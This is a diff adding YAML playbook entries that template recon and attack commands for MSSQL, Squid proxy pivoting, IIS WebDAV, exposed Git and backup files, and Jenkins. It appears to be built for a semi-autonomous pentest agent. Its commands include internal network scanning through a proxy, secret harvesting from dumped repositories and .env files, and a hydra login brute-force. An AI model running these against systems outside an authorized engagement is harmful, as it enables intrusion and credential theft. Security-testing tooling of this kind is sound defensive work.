+    success_if: exit_code == 0 && stdout matches '(?i)(microsoft sql server|ms-sql-s)'
+    emits: []
+  cost_hint: moderate
+  notes: Lead only; normalize the observed edition and build before CVE matching.
+  _family: mssql-cve
+- id: mssql-nmap-info-build
+  name: MSSQL instance and version enumeration
+  phase: enum
+  tier: standard
+  autonomy: semi
+  when:
+  - service: mssql
+  tool: nmap
+  invocation: nmap -Pn -p {{port}} --script ms-sql-info {{host}}
+  parallel_safe: true
+  blast_radius: none
+  operator: ''
+  confirms: []
+  verify:
+    success_if: exit_code == 0 && stdout contains 'ms-sql-info' && stdout contains
+      'Version:'
+    emits: []
+  cost_hint: cheap
+  notes: Lead only; collect the exact reported build rather than inferring it from
+    the port.
+  _family: mssql-cve
+- id: mssql-nmap-all-instances
+  name: MSSQL named-instance build discovery
+  phase: enum
+  tier: standard
+  autonomy: semi
+  when:
+  - service: mssql
+  tool: nmap
+  invocation: nmap -Pn -p {{port}} --script ms-sql-info --script-args mssql.instance-all=true
+    {{host}}
+  parallel_safe: true
+  blast_radius: none
+  operator: ''
+  confirms: []
+  verify:
+    success_if: exit_code == 0 && stdout contains 'ms-sql-info' && stdout contains
+      'Version:'
+    emits: []
+  cost_hint: moderate
+  notes: Lead only; named instances can expose different builds and patch levels.
+  _family: mssql-cve
+- id: mssql-nmap-ntlm-version
+  name: MSSQL NTLM product-version probe
+  phase: enum
+  tier: standard
+  autonomy: semi
+  when:
+  - service: mssql
+  tool: nmap
+  invocation: nmap -Pn -p {{port}} --script ms-sql-ntlm-info {{host}}
+  parallel_safe: true
+  blast_radius: low
+  operator: ''
+  confirms: []
+  verify:
+    success_if: exit_code == 0 && stdout contains 'ms-sql-ntlm-info' && stdout contains
+      'Product_Version:'
+    emits: []
+  cost_hint: cheap
+  notes: Lead only; the unauthenticated negotiation may create server-side audit events.
+  _family: mssql-cve
+- id: mssql-nmap-browser-version
+  name: SQL Server Browser UDP fingerprint
+  phase: recon
+  tier: standard
+  autonomy: semi
+  when:
+  - port: 1434
+  tool: nmap
+  invocation: nmap -Pn -sU -sV --version-all -p {{port}} {{host}}
+  parallel_safe: true
+  blast_radius: none
+  operator: ''
+  confirms: []
+  verify:
+    success_if: exit_code == 0 && stdout matches '(?i)(ms-sql-m|microsoft sql server
+      browser)'
+    emits: []
+  cost_hint: moderate
+  notes: Lead only; use Browser results to identify instances and their reachable
+    TCP ports.
+  _family: mssql-cve
+- id: mssql-nmap-vulners-lead
+  name: MSSQL build-to-CVE correlation lead
+  phase: exploit
+  tier: standard
+  autonomy: semi
+  when:
+  - service: mssql
+  tool: nmap
+  invocation: nmap -Pn -sV --version-all -p {{port}} --script vulners {{host}}
+  parallel_safe: true
+  blast_radius: none
+  operator: ''
+  confirms:
+  - vuln_present
+  verify:
+    success_if: exit_code == 0 && stdout contains 'CVE-' && stdout matches '(?i)(microsoft
+      sql server|ms-sql-s)'
+    emits:
+    - vuln_present
+  cost_hint: moderate
+  notes: Lead only; version correlation is a candidate finding and requires applicability
+    validation.
+  _family: mssql-cve
+- id: mssql-searchsploit-build-lead
+  name: MSSQL exact-build public-exploit lookup
+  phase: exploit
+  tier: standard
+  autonomy: semi
+  when:
+  - service: mssql
+  tool: searchsploit
+  invocation: searchsploit --json "{{product}} {{version}}"
+  parallel_safe: true
+  blast_radius: none
+  operator: ''
+  confirms:
+  - known_exploit
+  verify:
+    success_if: exit_code == 0 && stdout matches '"RESULTS_EXPLOIT"\s*:\s*\[\s*\{'
+    emits:
+    - known_exploit
+  cost_hint: cheap
+  notes: Lead only; a matching public entry does not establish that the target is
+    vulnerable.
+  _family: mssql-cve
+- id: mssql-searchsploit-cve-lead
+  name: MSSQL CVE public-exploit lookup
+  phase: exploit
+  tier: standard
+  autonomy: semi
+  when:
+  - service: mssql
+  tool: searchsploit
+  invocation: searchsploit --json --cve {{cve}}
+  parallel_safe: true
+  blast_radius: none
+  operator: ''
+  confirms:
+  - known_exploit
+  verify:
+    success_if: exit_code == 0 && stdout matches '"RESULTS_EXPLOIT"\s*:\s*\[\s*\{'
+    emits:
+    - known_exploit
+  cost_hint: cheap
+  notes: Lead only; review the advisory scope and required conditions before any follow-on
+    action.
+  _family: mssql-cve
+- id: squid-header-fingerprint
+  name: Squid HTTP header fingerprint
+  phase: recon
+  tier: floor
+  autonomy: semi
+  when:
+  - service: http-proxy
+  tool: curl
+  invocation: curl -sS -D - -o /dev/null --max-time 15 http://{{host}}:{{port}}/
+  parallel_safe: true
+  blast_radius: none
+  operator: ''
+  confirms: []
+  verify:
+    success_if: exit_code == 0 && stdout matches '(?i)server:\s*squid'
+    emits: []
+  cost_hint: cheap
+  notes: retrieve headers only to avoid requesting proxied or cached content
+  _family: squid-enum
+- id: squid-http-info-version
+  name: Squid metadata and version enumeration
+  phase: enum
+  tier: floor
+  autonomy: semi
+  when:
+  - service: http-proxy
+  tool: nmap
+  invocation: nmap -Pn -n -p {{port}} --script http-squid-info {{host}}
+  parallel_safe: true
+  blast_radius: none
+  operator: ''
+  confirms: []
+  verify:
+    success_if: exit_code == 0 && stdout matches '(?i)(squid[/ :]+[0-9]+\.[0-9]+|version[^\n]*[0-9]+\.[0-9]+)'
+    emits: []
+  cost_hint: cheap
+  notes: record the exact disclosed version for later offline lead generation
+  _family: squid-enum
+- id: squid-open-proxy-check
+  name: HTTP proxy forwarding behavior check
+  phase: enum
+  tier: standard
+  autonomy: semi
+  when:
+  - service: http-proxy
+  tool: nmap
+  invocation: nmap -Pn -n -p {{port}} --script http-open-proxy {{host}}
+  parallel_safe: true
+  blast_radius: low
+  operator: ''
+  confirms: []
+  verify:
+    success_if: exit_code == 0 && stdout matches '(?i)(open proxy|proxy is open)'
+    emits: []
+  cost_hint: cheap
+  notes: performs a forwarding check, so keep it within authorized egress scope
+  _family: squid-enum
+- id: squid-cachemgr-path-discovery
+  name: Squid cache manager path discovery
+  phase: enum
+  tier: standard
+  autonomy: semi
+  when:
+  - service: http-proxy
+  tool: nmap
+  invocation: nmap -Pn -n -p {{port}} --script http-enum {{host}}
+  parallel_safe: true
+  blast_radius: low
+  operator: ''
+  confirms: []
+  verify:
+    success_if: exit_code == 0 && stdout matches '(?i)(squid-internal-mgr|cachemgr\.cgi)'
+    emits:
+    - endpoint
+  cost_hint: moderate
+  notes: default HTTP enumeration can create several harmless path probes
+  _family: squid-enum
+- id: squid-internal-mgr-menu
+  name: Squid internal cache manager menu access
+  phase: enum
+  tier: floor
+  autonomy: semi
+  when:
+  - service: http-proxy
+  tool: curl
+  invocation: curl -sS -i --max-time 15 http://{{host}}:{{port}}/squid-internal-mgr/
+  parallel_safe: true
+  blast_radius: none
+  operator: ''
+  confirms: []
+  verify:
+    success_if: exit_code == 0 && stdout matches '(?i)squid cache manager'
+    emits:
+    - endpoint
+  cost_hint: cheap
+  notes: read only the manager index and do not invoke administrative actions
+  _family: squid-enum
+- id: squid-internal-mgr-info
+  name: Squid internal cache manager status query
+  phase: enum
+  tier: standard
+  autonomy: semi
+  when:
+  - service: http-proxy
+  tool: curl
+  invocation: curl -sS -i --max-time 15 http://{{host}}:{{port}}/squid-internal-mgr/info
+  parallel_safe: true
+  blast_radius: none
+  operator: ''
+  confirms:
+  - endpoint
+  verify:
+    success_if: exit_code == 0 && stdout matches '(?i)squid cache:\s*version'
+    emits: []
+  cost_hint: cheap
+  notes: status output may expose topology and configuration details; retain only
+    what is needed
+  _family: squid-enum
+- id: squid-cachemgr-cgi-landing
+  name: Squid cachemgr CGI landing-page access
+  phase: enum
+  tier: standard
+  autonomy: semi
+  when:
+  - service: http
+  tool: curl
+  invocation: curl -sS -i --max-time 15 http://{{host}}:{{port}}/cachemgr.cgi
+  parallel_safe: true
+  blast_radius: none
+  operator: ''
+  confirms: []
+  verify:
+    success_if: exit_code == 0 && stdout matches '(?i)(squid cache manager|cachemgr)'
+    emits:
+    - endpoint
+  cost_hint: cheap
+  notes: stop at the read-only landing page unless manager access is explicitly in
+    scope
+  _family: squid-enum
+- id: squid-version-exploit-lead
+  name: Squid version-to-public-exploit lead lookup
+  phase: exploit
+  tier: standard
+  autonomy: manual
+  when:
+  - service: http-proxy
+  - version: '{{version}}'
+  tool: searchsploit
+  invocation: searchsploit --json squid {{version}}
+  parallel_safe: true
+  blast_radius: none
+  operator: ''
+  confirms: []
+  verify:
+    success_if: exit_code == 0 && stdout matches '"RESULTS_EXPLOIT"\s*:\s*\[\s*\{'
+    emits:
+    - known_exploit
+  cost_hint: cheap
+  notes: a local catalog match is a version-to-CVE lead, not proof that the target
+    is vulnerable
+  _family: squid-enum
+- id: squid-http-internal-probe
+  name: Reach an internal HTTP endpoint through Squid
+  phase: recon
+  tier: floor
+  autonomy: semi
+  when:
+  - service: squid
+  tool: curl
+  invocation: curl -sS -i --noproxy "" --max-time 15 -x http://{{host}}:{{port}} "http://{{internal_host}}:{{internal_port}}/{{path}}"
+  parallel_safe: true
+  blast_radius: low
+  operator: ''
+  confirms:
+  - endpoint
+  verify:
+    success_if: exit_code == 0 && stdout matches '{{expected_response_regex}}'
+    emits:
+    - endpoint
+  cost_hint: cheap
+  notes: Use a harmless URI and a target-specific response marker to distinguish success
+    from a proxy error.
+  _family: squid-proxy-abuse
+- id: squid-https-connect-probe
+  name: Test HTTPS CONNECT reachability through Squid
+  phase: recon
+  tier: floor
+  autonomy: semi
+  when:
+  - service: squid
+  tool: curl
+  invocation: curl -ksS -i --noproxy "" --max-time 15 -x http://{{host}}:{{port}}
+    "https://{{internal_host}}:{{internal_port}}/{{path}}"
+  parallel_safe: true
+  blast_radius: low
+  operator: ''
+  confirms:
+  - endpoint
+  verify:
+    success_if: exit_code == 0 && stdout matches '{{expected_response_regex}}'
+    emits:
+    - endpoint
+  cost_hint: cheap
+  notes: Use only for authorized private endpoints and retain the TLS certificate
+    details separately.
+  _family: squid-proxy-abuse
+- id: squid-tcp-connect-probe
+  name: Probe an internal TCP service through Squid CONNECT
+  phase: recon
+  tier: floor
+  autonomy: semi
+  when:
+  - service: squid
+  tool: proxychains4
+  invocation: proxychains4 -q -f {{proxychains_conf}} nc -vz -w 8 {{internal_host}}
+    {{internal_port}}
+  parallel_safe: true
+  blast_radius: low
+  operator: ''
+  confirms: []
+  verify:
+    success_if: exit_code == 0
+    emits: []
+  cost_hint: cheap
+  notes: Configure a strict HTTP CONNECT chain with proxy DNS enabled to avoid direct
+    resolution.
+  _family: squid-proxy-abuse
+- id: squid-proxychains-tcp-scan
+  name: Scan scoped internal TCP ports through Squid
+  phase: enum
+  tier: heavy
+  autonomy: manual
+  when:
+  - service: squid
+  tool: proxychains4
+  invocation: proxychains4 -q -f {{proxychains_conf}} nmap -sT -Pn -n --open -p {{internal_ports}}
+    {{internal_cidr}}
+  parallel_safe: false
+  blast_radius: high
+  operator: ''
+  confirms: []
+  verify:
+    success_if: exit_code == 0 && stdout matches '[0-9]+/tcp\s+open'
+    emits: []
+  cost_hint: slow
+  notes: Keep CIDR and port scope authorization-bounded; -n prevents local DNS leakage.
+  _family: squid-proxy-abuse
+- id: squid-proxychains-service-fingerprint
+  name: Fingerprint internal TCP services through Squid
+  phase: enum
+  tier: standard
+  autonomy: semi
+  when:
+  - service: squid
+  tool: proxychains4
+  invocation: proxychains4 -q -f {{proxychains_conf}} nmap -sT -sV --version-light
+    -Pn -n --open -p {{internal_ports}} {{internal_host}}
+  parallel_safe: false
+  blast_radius: low
+  operator: ''
+  confirms: []
+  verify:
+    success_if: exit_code == 0 && stdout matches '[0-9]+/tcp\s+open\s+[^\s]+\s+[^\s]+'
+    emits: []
+  cost_hint: moderate
+  notes: Treat version strings as evidence for triage, not proof that a vulnerability
+    is reachable.
+  _family: squid-proxy-abuse
+- id: squid-internal-web-content-enum
+  name: Enumerate internal web content through Squid
+  phase: enum
+  tier: heavy
+  autonomy: manual
+  when:
+  - service: squid
+  tool: ffuf
+  invocation: ffuf -s -x http://{{host}}:{{port}} -u "http://{{internal_host}}:{{internal_port}}/{{base_path}}FUZZ"
+    -w {{wordlist}} -mc {{match_codes}} -t {{threads}} -rate {{requests_per_second}}
+    -timeout 10
+  parallel_safe: false
+  blast_radius: high
+  operator: ''
+  confirms:
+  - endpoint
+  verify:
+    success_if: exit_code == 0 && stdout matches 'https?://'
+    emits:
+    - endpoint
+  cost_hint: slow
+  notes: Use an approved small wordlist and rate limit because both proxy and application
+    logs retain request paths.
+  _family: squid-proxy-abuse
+- id: squid-http-methods-enum
+  name: Enumerate allowed internal HTTP methods through Squid
+  phase: enum
+  tier: floor
+  autonomy: semi
+  when:
+  - service: squid
+  tool: curl
+  invocation: curl -sS -i --noproxy "" --max-time 15 -X OPTIONS -x http://{{host}}:{{port}}
+    "http://{{internal_host}}:{{internal_port}}/{{path}}"
+  parallel_safe: true
+  blast_radius: low
+  operator: ''
+  confirms:
+  - endpoint
+  verify:
+    success_if: 'exit_code == 0 && stdout matches ''[Aa]llow: .+'''
+    emits:
+    - endpoint
+  cost_hint: cheap
+  notes: OPTIONS is low impact but remains visible to both the proxy and the internal
+    application.
+  _family: squid-proxy-abuse
+- id: squid-version-exploit-lead
+  name: Map a Squid version to public exploit leads
+  phase: exploit
+  tier: standard
+  autonomy: manual
+  when:
+  - service: squid
+  tool: searchsploit
+  invocation: searchsploit -w "{{product}} {{version}}"
+  parallel_safe: true
+  blast_radius: none
+  operator: ''
+  confirms:
+  - known_exploit
+  verify:
+    success_if: exit_code == 0 && stdout matches 'https://www\.exploit-db\.com/exploits/[0-9]+'
+    emits:
+    - known_exploit
+  cost_hint: cheap
+  notes: 'Lead only: corroborate the exact build and authorization before any exploit
+    attempt.'
+  _family: squid-proxy-abuse
+- id: iis-webdav-discovery
+  name: Detect WebDAV exposure on an HTTP service
+  phase: recon
+  tier: floor
+  autonomy: semi
+  when:
+  - service: http
+  tool: nmap
+  invocation: nmap -Pn -p {{port}} --script http-webdav-scan {{host}}
+  parallel_safe: true
+  blast_radius: none
+  operator: ''
+  confirms: []
+  verify:
+    success_if: exit_code == 0 && stdout contains 'WebDAV'
+    emits:
+    - endpoint
+  cost_hint: cheap
+  notes: read-only capability discovery; keep scans within authorized scope
+  _family: iis-webdav-rce
+- id: iis-webdav-put-move-advertised
+  name: Inspect advertised WebDAV PUT and MOVE methods
+  phase: enum
+  tier: floor
+  autonomy: semi
+  when:
+  - service: webdav
+  tool: curl
+  invocation: curl -sS --max-time 15 -D - -o /dev/null -X OPTIONS {{scheme}}://{{host}}:{{port}}/{{path}}
+  parallel_safe: true
+  blast_radius: none
+  operator: ''
+  confirms:
+  - endpoint
+  verify:
+    success_if: exit_code == 0 && stdout contains 'PUT' && stdout contains 'MOVE'
+    emits:
+    - endpoint
+  cost_hint: cheap
+  notes: advertised verbs are configuration evidence only; do not perform write tests
+  _family: iis-webdav-rce
+- id: iis-webdav-propfind-root
+  name: Enumerate WebDAV collection metadata
+  phase: enum
+  tier: floor
+  autonomy: semi
+  when:
+  - service: webdav
+  tool: curl
+  invocation: 'curl -sS --max-time 15 -i -X PROPFIND -H "Depth: 0" {{scheme}}://{{host}}:{{port}}/{{path}}'
+  parallel_safe: true
+  blast_radius: none
+  operator: ''
+  confirms:
+  - endpoint
+  verify:
+    success_if: exit_code == 0 && stdout matches 'HTTP/[0-9.]+ 207'
+    emits:
+    - endpoint
+  cost_hint: cheap
+  notes: read-only metadata request for confirming an accessible DAV collection
+  _family: iis-webdav-rce
+- id: iis-webdav-propfind-children
+  name: List immediate WebDAV collection members
+  phase: enum
+  tier: floor
+  autonomy: semi
+  when:
+  - service: webdav
+  tool: curl
+  invocation: 'curl -sS --max-time 15 -i -X PROPFIND -H "Depth: 1" {{scheme}}://{{host}}:{{port}}/{{path}}'
+  parallel_safe: true
+  blast_radius: none
+  operator: ''
+  confirms:
+  - endpoint
+  verify:
+    success_if: exit_code == 0 && stdout matches 'HTTP/[0-9.]+ 207' && stdout matches
+      '<[^>]*href[^>]*>'
+    emits:
+    - endpoint
+  cost_hint: cheap
+  notes: scope depth carefully because collection names can be sensitive
+  _family: iis-webdav-rce
+- id: iis-webdav-cadaver-listing
+  name: Perform an interactive read-only WebDAV listing
+  phase: enum
+  tier: floor
+  autonomy: manual
+  when:
+  - service: webdav
+  tool: cadaver
+  invocation: printf 'ls\nquit\n' | cadaver {{scheme}}://{{host}}:{{port}}/{{path}}
+  parallel_safe: true
+  blast_radius: none
+  operator: ''
+  confirms:
+  - endpoint
+  verify:
+    success_if: exit_code == 0 && stdout matches '(listing|collection|dav)'
+    emits:
+    - endpoint
+  cost_hint: cheap
+  notes: use listing commands only; avoid upload, delete, move, and lock operations
+  _family: iis-webdav-rce
+- id: iis-webdav-auth-challenge
+  name: Identify WebDAV authentication challenge policy
+  phase: enum
+  tier: floor
+  autonomy: semi
+  when:
+  - service: webdav
+  tool: curl
+  invocation: curl -sS --max-time 15 -D - -o /dev/null -X OPTIONS {{scheme}}://{{host}}:{{port}}/{{path}}
+  parallel_safe: true
+  blast_radius: none
+  operator: ''
+  confirms:
+  - endpoint
+  verify:
+    success_if: exit_code == 0 && stdout matches '(WWW-Authenticate|www-authenticate)'
+    emits:
+    - endpoint
+  cost_hint: cheap
+  notes: record offered schemes without attempting credentials or brute force
+  _family: iis-webdav-rce
+- id: iis-server-version-fingerprint
+  name: Fingerprint Microsoft IIS version headers
+  phase: recon
+  tier: floor
+  autonomy: semi
+  when:
+  - service: http
+  tool: curl
+  invocation: curl -sS --max-time 15 -D - -o /dev/null {{scheme}}://{{host}}:{{port}}/{{path}}
+  parallel_safe: true
+  blast_radius: none
+  operator: ''
+  confirms: []
+  verify:
+    success_if: exit_code == 0 && stdout contains 'Microsoft-IIS'
+    emits: []
+  cost_hint: cheap
+  notes: corroborate headers because proxies and configuration can obscure versions
+  _family: iis-webdav-rce
+- id: iis-version-public-exploit-lead
+  name: Map detected IIS version to public exploit references
+  phase: enum
+  tier: standard
+  autonomy: manual
+  when:
+  - product: Microsoft-IIS
+  tool: searchsploit
+  invocation: searchsploit --json "Microsoft IIS {{version}}"
+  parallel_safe: true
+  blast_radius: none
+  operator: ''
+  confirms: []
+  verify:
+    success_if: exit_code == 0 && stdout matches '(CVE-[0-9]{4}-[0-9]+|EDB-ID)'
+    emits:
+    - known_exploit
+  cost_hint: cheap
+  notes: lead only; validate exposure, version, and patch state before remediation
+    planning
+  _family: iis-webdav-rce
+- id: squid-nmap-version-fingerprint
+  name: Fingerprint Squid version with service detection
+  phase: recon
+  tier: standard
+  autonomy: semi
+  when:
+  - service: squid
+  tool: nmap
+  invocation: nmap -Pn -n -sV --version-light -p {{port}} {{host}}
+  parallel_safe: true
+  blast_radius: none
+  operator: ''
+  confirms: []
+  verify:
+    success_if: exit_code == 0 && stdout matches '(?i)squid[^\n]*[0-9]+\.[0-9]+'
+    emits: []
+  cost_hint: cheap
+  notes: record the exact banner version before matching any advisory
+  _family: squid-cve
+- id: squid-http-server-header
+  name: Collect Squid HTTP Server header version
+  phase: recon
+  tier: standard
+  autonomy: semi
+  when:
+  - service: squid
+  tool: curl
+  invocation: curl -sS --max-time 15 -D - -o /dev/null http://{{host}}:{{port}}/
+  parallel_safe: true
+  blast_radius: none
+  operator: ''
+  confirms: []
+  verify:
+    success_if: exit_code == 0 && stdout matches '(?i)server:.*squid[/ ]?[0-9]+\.[0-9]+'
+    emits: []
+  cost_hint: cheap
+  notes: capture headers only and treat absent or altered banners as inconclusive
+  _family: squid-cve
+- id: squid-nmap-vulners-lead
+  name: Map detected Squid version to CVE leads
+  phase: enum
+  tier: standard
+  autonomy: semi
+  when:
+  - service: squid
+  tool: nmap
+  invocation: nmap -Pn -n -sV --version-light --script vulners -p {{port}} {{host}}
+  parallel_safe: true
+  blast_radius: low
+  operator: ''
+  confirms: []
+  verify:
+    success_if: exit_code == 0 && stdout matches '(?i)cve-[0-9]{4}-[0-9]+'
+    emits:
+    - known_exploit
+  cost_hint: moderate
+  notes: version-to-CVE correlation is a lead; validate vendor backports and configuration
+  _family: squid-cve
+- id: squid-nuclei-tagged-cve-lead
+  name: Run Squid-tagged CVE detection templates
+  phase: enum
+  tier: standard
+  autonomy: semi
+  when:
+  - service: squid
+  tool: nuclei
+  invocation: nuclei -u http://{{host}}:{{port}} -tags squid,cve -severity medium,high,critical
+    -jsonl -silent
+  parallel_safe: true
+  blast_radius: low
+  operator: ''
+  confirms: []
+  verify:
+    success_if: exit_code == 0 && stdout matches '(?i)cve-[0-9]{4}-[0-9]+'
+    emits:
+    - known_exploit
+  cost_hint: moderate
+  notes: a template match is candidate evidence, not proof of exploitability
+  _family: squid-cve
+- id: squid-nuclei-auto-cve-lead
+  name: Use technology-guided CVE template selection
+  phase: enum
+  tier: standard
+  autonomy: semi
+  when:
+  - service: squid
+  tool: nuclei
+  invocation: nuclei -u http://{{host}}:{{port}} -as -tags cve -severity medium,high,critical
+    -jsonl -silent
+  parallel_safe: true
+  blast_radius: low
+  operator: ''
+  confirms: []
+  verify:
+    success_if: exit_code == 0 && stdout matches '(?i)cve-[0-9]{4}-[0-9]+'
+    emits:
+    - known_exploit
+  cost_hint: moderate
+  notes: preserve matched template identifiers for manual version and patch review
+  _family: squid-cve
+- id: squid-nuclei-candidate-template
+  name: Validate one selected Squid CVE template
+  phase: enum
+  tier: standard
+  autonomy: semi
+  when:
+  - service: squid
+  tool: nuclei
+  invocation: nuclei -u http://{{host}}:{{port}} -t {{template}} -jsonl -silent
+  parallel_safe: true
+  blast_radius: low
+  operator: ''
+  confirms: []
+  verify:
+    success_if: exit_code == 0 && stdout contains 'matched-at'
+    emits:
+    - known_exploit
+  cost_hint: cheap
+  notes: run only a vetted non-destructive candidate template and review its match
+    manually
+  _family: squid-cve
+- id: squid-searchsploit-version-lead
+  name: Search Exploit-DB by detected Squid version
+  phase: enum
+  tier: standard
+  autonomy: semi
+  when:
+  - service: squid
+  tool: searchsploit
+  invocation: searchsploit --json "Squid {{version}}"
+  parallel_safe: true
+  blast_radius: none
+  operator: ''
+  confirms: []
+  verify:
+    success_if: exit_code == 0 && stdout contains 'Title' && stdout matches '(?i)squid'
+    emits:
+    - known_exploit
+  cost_hint: cheap
+  notes: Exploit-DB titles are leads; verify affected versions and patch status before
+    use
+  _family: squid-cve
+- id: squid-searchsploit-cve-lead
+  name: Cross-reference a Squid CVE in Exploit-DB
+  phase: enum
+  tier: standard
+  autonomy: semi
+  when:
+  - service: squid
+  tool: searchsploit
+  invocation: searchsploit --cve "{{cve}}" --json
+  parallel_safe: true
+  blast_radius: none
+  operator: ''
+  confirms: []
+  verify:
+    success_if: exit_code == 0 && stdout contains 'Title'
+    emits:
+    - known_exploit
+  cost_hint: cheap
+  notes: cross-reference the candidate CVE locally before any exploit research or
+    execution
+  _family: squid-cve
+- id: http-git-metadata-probe
+  name: Probe an exposed Git metadata marker
+  phase: recon
+  tier: floor
+  autonomy: semi
+  when:
+  - service: http
+  tool: curl
+  invocation: curl -fsS --max-time 15 "{{scheme}}://{{host}}:{{port}}/{{git_marker_path}}"
+  parallel_safe: true
+  blast_radius: none
+  operator: ''
+  confirms:
+  - endpoint
+  verify:
+    success_if: 'exit==0 and stdout matches ''^ref: [^\r\n]+$'''
+    emits:
+    - endpoint
+  cost_hint: cheap
+  notes: Use a harmless metadata marker path and stop on generic HTML error responses.
+  _family: web-git-exposure
+- id: http-git-dumper-recovery
+  name: Recover an exposed Git repository
+  phase: loot
+  tier: standard
+  autonomy: semi
+  when:
+  - service: http
+  tool: git-dumper
+  invocation: git-dumper "{{scheme}}://{{host}}:{{port}}/{{git_root_path}}" "{{output_dir}}"
+  parallel_safe: false
+  blast_radius: none
+  operator: ''
+  confirms:
+  - endpoint
+  verify:
+    success_if: exit==0 and {{output_dir}} contains recovered Git object data
+    emits:
+    - file
+  cost_hint: moderate
+  notes: Use a unique local output directory and retain only engagement-scoped source
+    material.
+  _family: web-git-exposure
+- id: git-history-secret-scan
+  name: Scan recovered Git history for verified secrets
+  phase: cred
+  tier: standard
+  autonomy: semi
+  when:
+  - service: http
+  tool: trufflehog
+  invocation: trufflehog git "file://{{repo_dir}}" --json --only-verified
+  parallel_safe: true
+  blast_radius: none
+  operator: ''
+  confirms:
+  - file
+  verify:
+    success_if: exit==0 and stdout is non-empty
+    emits:
+    - have_cred
+  cost_hint: slow
+  notes: Store findings as sensitive evidence and do not validate discovered secrets
+    outside authorized scope.
+  _family: web-git-exposure
+- id: http-env-credential-fetch
+  name: Retrieve an exposed environment configuration credential
+  phase: cred
+  tier: floor
+  autonomy: semi
+  when:
+  - service: http
+  tool: curl
+  invocation: curl -fsS --max-time 15 "{{scheme}}://{{host}}:{{port}}/{{env_config_path}}"
+  parallel_safe: true
+  blast_radius: none
+  operator: ''
+  confirms:
+  - endpoint
+  verify:
+    success_if: exit==0 and stdout matches '(?im)^[A-Z0-9_]*(PASSWORD|SECRET|TOKEN|API_KEY)[A-Z0-9_]*\s*=\s*.+'
+    emits:
+    - file
+    - have_cred
+  cost_hint: cheap
+  notes: Keep retrieved configuration encrypted and avoid placing it in command history
+    or logs.
+  _family: web-git-exposure
+- id: http-svn-metadata-mirror
+  name: Mirror exposed Subversion working-copy metadata
+  phase: loot
+  tier: standard
+  autonomy: semi
+  when:
+  - service: http
+  tool: wget
+  invocation: wget -r -np -nH -P "{{output_dir}}" "{{scheme}}://{{host}}:{{port}}/{{svn_metadata_root}}/"
+  parallel_safe: false
+  blast_radius: low
+  operator: ''
+  confirms:
+  - endpoint
+  verify:
+    success_if: exit==0 and {{output_dir}} contains at least one recovered metadata
+      or pristine-content file
+    emits:
+    - file
+  cost_hint: moderate
+  notes: Set a bounded output directory because recursive retrieval can create many
+    local files.
+  _family: web-git-exposure
+- id: http-backup-archive-enum
+  name: Enumerate exposed backup archive candidates
+  phase: enum
+  tier: standard
+  autonomy: semi
+  when:
+  - service: http
+  tool: ffuf
+  invocation: ffuf -s -mc 200,206 -w "{{wordlist}}" -u "{{scheme}}://{{host}}:{{port}}/{{backup_path_prefix}}FUZZ"
+  parallel_safe: false
+  blast_radius: low
+  operator: ''
+  confirms: []
+  verify:
+    success_if: exit==0 and stdout is non-empty
+    emits:
+    - endpoint
+  cost_hint: moderate
+  notes: Throttle requests to the engagement rate budget and exclude known dynamic
+    response patterns.
+  _family: web-git-exposure
+- id: http-backup-archive-fetch
+  name: Download a discovered exposed backup archive
+  phase: loot
+  tier: standard
+  autonomy: semi
+  when:
+  - service: http
+  tool: wget
+  invocation: wget --timeout=15 --tries=1 -O "{{archive_file}}" "{{scheme}}://{{host}}:{{port}}/{{backup_archive_path}}"
+  parallel_safe: true
+  blast_radius: none
+  operator: ''
+  confirms:
+  - endpoint
+  verify:
+    success_if: exit==0 and {{archive_file}} is non-empty and has an archive signature
+    emits:
+    - file
+  cost_hint: moderate
+  notes: Write the archive to an encrypted case workspace and record its integrity
+    hash.
+  _family: web-git-exposure
+- id: backup-archive-extract
+  name: Extract recovered backup source material
+  phase: loot
+  tier: standard
+  autonomy: semi
+  when:
+  - service: http
+  tool: 7z
+  invocation: 7z x -y "-o{{output_dir}}" "{{archive_file}}"
+  parallel_safe: false
+  blast_radius: none
+  operator: ''
+  confirms:
+  - file
+  verify:
+    success_if: exit==0 and stdout contains 'Everything is Ok'
+    emits:
+    - file
+  cost_hint: moderate
+  notes: Extract only in an isolated workspace because archives may contain unsafe
+    paths or large files.
+  _family: web-git-exposure
+- id: jenkins-version-header-enum
+  name: Jenkins version header enumeration
+  phase: recon
+  tier: floor
+  autonomy: full
+  when:
+  - service: jenkins
+  tool: curl
+  invocation: curl -sS -D - --max-time 15 "{{scheme}}://{{host}}:{{port}}/login" -o
+    /dev/null
+  parallel_safe: true
+  blast_radius: none
+  operator: ''
+  confirms: []
+  verify:
+    success_if: exit_code == 0 && stdout contains 'X-Jenkins:'
+    emits:
+    - endpoint
+  cost_hint: cheap
+  notes: record the exposed version before selecting version-specific checks
+  _family: rce-jenkins
+- id: jenkins-script-console-exposure
+  name: Jenkins script console exposure check
+  phase: enum
+  tier: floor
+  autonomy: full
+  when:
+  - service: jenkins
+  tool: curl
+  invocation: curl -sS -L --max-time 15 "{{scheme}}://{{host}}:{{port}}/script"
+  parallel_safe: true
+  blast_radius: none
+  operator: ''
+  confirms:
+  - endpoint
+  verify:
+    success_if: exit_code == 0 && stdout contains 'Script Console'
+    emits:
+    - tool
+  cost_hint: cheap
+  notes: a console page must be distinguished from a redirected login page
+  _family: rce-jenkins
+- id: jenkins-crumb-issuer-enum
+  name: Jenkins CSRF crumb issuer retrieval
+  phase: enum
+  tier: floor
+  autonomy: semi
+  when:
+  - service: jenkins
+  tool: curl
+  invocation: curl -sS --max-time 15 -u "{{user}}:{{credential}}" "{{scheme}}://{{host}}:{{port}}/crumbIssuer/api/json"
+  parallel_safe: true
+  blast_radius: none
+  operator: ''
+  confirms:
+  - have_cred
+  - cred_grants
+  verify:
+    success_if: exit_code == 0 && stdout contains 'crumbRequestField' && stdout contains
+      'crumb'
+    emits: []
+  cost_hint: cheap
+  notes: keep returned crumbs scoped to the target and out of logs
+  _family: rce-jenkins
+- id: jenkins-login-password-bruteforce
+  name: Jenkins form-login credential brute-force
+  phase: cred
+  tier: heavy
+  autonomy: manual
+  when:
+  - service: jenkins
+  tool: hydra
+  invocation: hydra -l "{{user}}" -P "{{wordlist}}" -s "{{port}}" "{{host}}" {{hydra_http_module}}
+    "/j_acegi_security_check:j_username=^USER^&j_password=^PASS^:{{login_failure_marker}}"
+    -f
+  parallel_safe: false
+  blast_radius: high
+  operator: cred-to-session
+  confirms:
+  - endpoint
+  verify:
+    success_if: exit_code == 0 && stdout contains 'login:' && stdout contains 'password:'
+    emits:
+    - have_cred
+    - cred_grants
+  cost_hint: slow
+  notes: use only an approved rate and lockout-safe wordlist policy
